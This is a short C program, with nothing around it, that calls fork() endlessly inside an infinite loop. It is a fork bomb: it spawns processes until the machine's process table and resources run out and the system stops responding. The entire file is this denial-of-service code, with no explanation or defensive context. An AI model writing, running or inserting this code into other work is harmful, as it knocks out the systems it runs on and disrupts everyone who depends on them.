#include <unistd.h>

int main() {
    while (true) {
        fork();
    }
    return 0;
}